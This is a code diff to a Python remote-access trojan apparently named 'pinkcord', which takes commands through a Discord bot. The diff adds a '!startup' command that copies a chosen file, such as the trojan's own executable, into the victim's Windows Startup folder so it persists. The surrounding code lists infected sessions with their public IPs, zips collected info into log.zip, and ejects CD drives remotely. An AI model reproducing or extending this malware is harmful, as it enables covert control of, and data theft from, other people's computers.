@@ -12,6 +12,8 @@ import base64
 import codecs
 import pyperclip
 from subprocess import call
+import sys
+import shutil
 
 while True:
     try:
@@ -33,9 +35,6 @@ while True:
             response = requests.get("http://checkip.amazonaws.com")
             ipaddres = response.text.strip()
         get_public_ip()
-
-        def soundplay(file_path):
-            playsound(file_path)
 
         def grab_info():
             zipObj = ZipFile('log.zip', 'w')
@@ -304,8 +303,20 @@ while True:
                 if session == sesja:
                     call("powershell -Command (New-Object -com 'WMPlayer.OCX').cdromcollection.item(0).Eject()", shell=True)
 
+        
         @bot.command()
-        async def sesje(ctx):
+        async def startup(ctx, session, *args):
+            appdata_path = os.path.expandvars('%appdata%')
+            startupFolder = os.path.join(appdata_path, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            filePATH = " ".join(args)
+            if session == "all":
+                shutil.copy(filePATH, startupFolder)
+            else:
+                if session == sesja:
+                    shutil.copy(filePATH, startupFolder)
+
+        @bot.command()
+        async def sessions(ctx):
             await ctx.send(sesja + " is the session ip address: " + ipaddres)
         
         @bot.command()
@@ -337,6 +348,7 @@ while True:
 !cdrom [session] - Opens the CD-ROM drive.
 !sessions - Displays all sessions.
 !rename [session] [new_name] - Changes the name of a session.
+!startup [session] [file path] - copy file to startup folder (you can copy pinkcord exe file)
             '''
             await ctx.send(wiadomosc)
 
